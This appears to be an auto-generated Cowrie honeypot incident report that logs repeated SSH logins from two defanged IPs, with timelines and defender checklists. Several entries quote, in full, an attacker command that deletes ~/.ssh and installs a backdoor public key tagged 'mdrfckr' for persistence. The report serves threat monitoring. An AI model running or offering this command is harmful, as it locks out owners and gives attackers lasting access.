| `2026-04-29 14:23:38` | `cowrie.client.kex` |
| `2026-04-29 14:23:39` | `cowrie.login.success` |
| `2026-04-29 14:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9458f87eec97

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:26 |
| **Last Seen** | 2026-04-29 14:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:26:56` | `cowrie.session.connect` |
| `2026-04-29 14:26:56` | `cowrie.client.version` |
| `2026-04-29 14:26:56` | `cowrie.client.kex` |
| `2026-04-29 14:26:57` | `cowrie.login.success` |
| `2026-04-29 14:26:57` | `cowrie.session.params` |
| `2026-04-29 14:26:57` | `cowrie.command.input` |
| `2026-04-29 14:26:57` | `cowrie.command.failed` |
| `2026-04-29 14:26:57` | `cowrie.log.closed` |
| `2026-04-29 14:26:58` | `cowrie.session.params` |
| `2026-04-29 14:26:58` | `cowrie.command.input` |
| `2026-04-29 14:26:58` | `cowrie.session.file_download` |
| `2026-04-29 14:26:58` | `cowrie.log.closed` |
| `2026-04-29 14:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe4ac991195

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:27 |
| **Last Seen** | 2026-04-29 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:27:00` | `cowrie.session.connect` |
| `2026-04-29 14:27:00` | `cowrie.client.version` |
| `2026-04-29 14:27:00` | `cowrie.client.kex` |
| `2026-04-29 14:27:00` | `cowrie.login.success` |
| `2026-04-29 14:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9de7334566

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:28 |
| **Last Seen** | 2026-04-29 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:28:04` | `cowrie.session.connect` |
| `2026-04-29 14:28:04` | `cowrie.client.version` |
| `2026-04-29 14:28:05` | `cowrie.client.kex` |
| `2026-04-29 14:28:06` | `cowrie.login.success` |
| `2026-04-29 14:28:06` | `cowrie.session.params` |
| `2026-04-29 14:28:06` | `cowrie.command.input` |
| `2026-04-29 14:28:06` | `cowrie.command.failed` |
| `2026-04-29 14:28:06` | `cowrie.log.closed` |
| `2026-04-29 14:28:06` | `cowrie.session.params` |
| `2026-04-29 14:28:06` | `cowrie.command.input` |
| `2026-04-29 14:28:06` | `cowrie.session.file_download` |
| `2026-04-29 14:28:06` | `cowrie.log.closed` |
| `2026-04-29 14:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ca84eabdb8

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:28 |
| **Last Seen** | 2026-04-29 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:28:08` | `cowrie.session.connect` |
| `2026-04-29 14:28:08` | `cowrie.client.version` |
| `2026-04-29 14:28:08` | `cowrie.client.kex` |
| `2026-04-29 14:28:09` | `cowrie.login.success` |
| `2026-04-29 14:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4bdd0620e80

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:29 |
| **Last Seen** | 2026-04-29 14:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:29:18` | `cowrie.session.connect` |
| `2026-04-29 14:29:18` | `cowrie.client.version` |
| `2026-04-29 14:29:18` | `cowrie.client.kex` |
| `2026-04-29 14:29:19` | `cowrie.login.success` |
| `2026-04-29 14:29:19` | `cowrie.session.params` |
| `2026-04-29 14:29:19` | `cowrie.command.input` |
| `2026-04-29 14:29:19` | `cowrie.command.failed` |
| `2026-04-29 14:29:19` | `cowrie.log.closed` |
| `2026-04-29 14:29:19` | `cowrie.session.params` |
| `2026-04-29 14:29:19` | `cowrie.command.input` |
| `2026-04-29 14:29:19` | `cowrie.session.file_download` |
| `2026-04-29 14:29:19` | `cowrie.log.closed` |
| `2026-04-29 14:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d42902783bf

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:29 |
| **Last Seen** | 2026-04-29 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:29:21` | `cowrie.session.connect` |
| `2026-04-29 14:29:21` | `cowrie.client.version` |
| `2026-04-29 14:29:22` | `cowrie.client.kex` |
| `2026-04-29 14:29:22` | `cowrie.login.success` |
| `2026-04-29 14:29:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde95c48e46d

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:30 |
| **Last Seen** | 2026-04-29 14:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:30:30` | `cowrie.session.connect` |
| `2026-04-29 14:30:30` | `cowrie.client.version` |
| `2026-04-29 14:30:30` | `cowrie.client.kex` |
| `2026-04-29 14:30:31` | `cowrie.login.success` |
| `2026-04-29 14:30:31` | `cowrie.session.params` |
| `2026-04-29 14:30:31` | `cowrie.command.input` |
| `2026-04-29 14:30:31` | `cowrie.command.failed` |
| `2026-04-29 14:30:31` | `cowrie.log.closed` |
| `2026-04-29 14:30:31` | `cowrie.session.params` |
| `2026-04-29 14:30:31` | `cowrie.command.input` |
| `2026-04-29 14:30:31` | `cowrie.session.file_download` |
| `2026-04-29 14:30:31` | `cowrie.log.closed` |
| `2026-04-29 14:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf3e3b466716

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:30 |
| **Last Seen** | 2026-04-29 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:30:34` | `cowrie.session.connect` |
| `2026-04-29 14:30:34` | `cowrie.client.version` |
| `2026-04-29 14:30:34` | `cowrie.client.kex` |
| `2026-04-29 14:30:34` | `cowrie.login.success` |
| `2026-04-29 14:30:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da2bc2d494ae

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:31 |
| **Last Seen** | 2026-04-29 14:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:31:47` | `cowrie.session.connect` |
| `2026-04-29 14:31:47` | `cowrie.client.version` |
| `2026-04-29 14:31:47` | `cowrie.client.kex` |
| `2026-04-29 14:31:47` | `cowrie.login.success` |
| `2026-04-29 14:31:48` | `cowrie.session.params` |
| `2026-04-29 14:31:48` | `cowrie.command.input` |
| `2026-04-29 14:31:48` | `cowrie.command.failed` |
| `2026-04-29 14:31:48` | `cowrie.log.closed` |
| `2026-04-29 14:31:48` | `cowrie.session.params` |
| `2026-04-29 14:31:48` | `cowrie.command.input` |
| `2026-04-29 14:31:48` | `cowrie.session.file_download` |
| `2026-04-29 14:31:48` | `cowrie.log.closed` |
| `2026-04-29 14:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54507b0cc2da

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:31 |
| **Last Seen** | 2026-04-29 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:31:50` | `cowrie.session.connect` |
| `2026-04-29 14:31:50` | `cowrie.client.version` |
| `2026-04-29 14:31:50` | `cowrie.client.kex` |
| `2026-04-29 14:31:51` | `cowrie.login.success` |
| `2026-04-29 14:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04162fe201ff

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:32 |
| **Last Seen** | 2026-04-29 14:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:32:57` | `cowrie.session.connect` |
| `2026-04-29 14:32:57` | `cowrie.client.version` |
| `2026-04-29 14:32:57` | `cowrie.client.kex` |
| `2026-04-29 14:32:58` | `cowrie.login.success` |
| `2026-04-29 14:32:58` | `cowrie.session.params` |
| `2026-04-29 14:32:58` | `cowrie.command.input` |
| `2026-04-29 14:32:58` | `cowrie.command.failed` |
| `2026-04-29 14:32:58` | `cowrie.log.closed` |
| `2026-04-29 14:32:58` | `cowrie.session.params` |
| `2026-04-29 14:32:58` | `cowrie.command.input` |
| `2026-04-29 14:32:58` | `cowrie.session.file_download` |
| `2026-04-29 14:32:58` | `cowrie.log.closed` |
| `2026-04-29 14:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936160e9ac84

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:33 |
| **Last Seen** | 2026-04-29 14:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:33:05` | `cowrie.session.connect` |
| `2026-04-29 14:33:05` | `cowrie.client.version` |
| `2026-04-29 14:33:05` | `cowrie.client.kex` |
| `2026-04-29 14:33:05` | `cowrie.login.success` |
| `2026-04-29 14:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52dc583ea41f

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:34 |
| **Last Seen** | 2026-04-29 14:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:34:05` | `cowrie.session.connect` |
| `2026-04-29 14:34:05` | `cowrie.client.version` |
| `2026-04-29 14:34:06` | `cowrie.client.kex` |
| `2026-04-29 14:34:06` | `cowrie.login.success` |
| `2026-04-29 14:34:06` | `cowrie.session.params` |
| `2026-04-29 14:34:06` | `cowrie.command.input` |
| `2026-04-29 14:34:06` | `cowrie.command.failed` |
| `2026-04-29 14:34:06` | `cowrie.log.closed` |
| `2026-04-29 14:34:06` | `cowrie.session.params` |
| `2026-04-29 14:34:06` | `cowrie.command.input` |
| `2026-04-29 14:34:06` | `cowrie.session.file_download` |
| `2026-04-29 14:34:06` | `cowrie.log.closed` |
| `2026-04-29 14:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf6e77f9aeb

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:34 |
| **Last Seen** | 2026-04-29 14:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:34:09` | `cowrie.session.connect` |
| `2026-04-29 14:34:09` | `cowrie.client.version` |
| `2026-04-29 14:34:09` | `cowrie.client.kex` |
| `2026-04-29 14:34:09` | `cowrie.login.success` |
| `2026-04-29 14:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7de3285a0e3

| Field | Detail |
|---|---|
| **Source IP** | `185.239.239[.]67` |
| **First Seen** | 2026-04-29 14:36 |
| **Last Seen** | 2026-04-29 14:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:36:07` | `cowrie.session.connect` |
| `2026-04-29 14:36:07` | `cowrie.client.version` |
| `2026-04-29 14:36:07` | `cowrie.client.kex` |
| `2026-04-29 14:36:08` | `cowrie.login.success` |
| `2026-04-29 14:36:08` | `cowrie.session.params` |
| `2026-04-29 14:36:08` | `cowrie.command.input` |
| `2026-04-29 14:36:08` | `cowrie.command.failed` |
| `2026-04-29 14:36:08` | `cowrie.log.closed` |
| `2026-04-29 14:36:09` | `cowrie.session.params` |
| `2026-04-29 14:36:09` | `cowrie.command.input` |
| `2026-04-29 14:36:09` | `cowrie.session.file_download` |
| `2026-04-29 14:36:09` | `cowrie.log.closed` |
| `2026-04-29 14:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.239[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.239.239[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54689f46b480

| Field | Detail |
|---|---|
| **Source IP** | `185.239.239[.]67` |
| **First Seen** | 2026-04-29 14:36 |
| **Last Seen** | 2026-04-29 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 14:36:11` | `cowrie.session.connect` |
| `2026-04-29 14:36:11` | `cowrie.client.version` |
| `2026-04-29 14:36:11` | `cowrie.client.kex` |
| `2026-04-29 14:36:12` | `cowrie.login.success` |
| `2026-04-29 14:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.239[.]67` to AbuseIPDB if not already reported
- [ ] Block `185.239.239[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a37ed32a3c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-29 14:39 |
| **Last Seen** | 2026-04-29 14:39 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
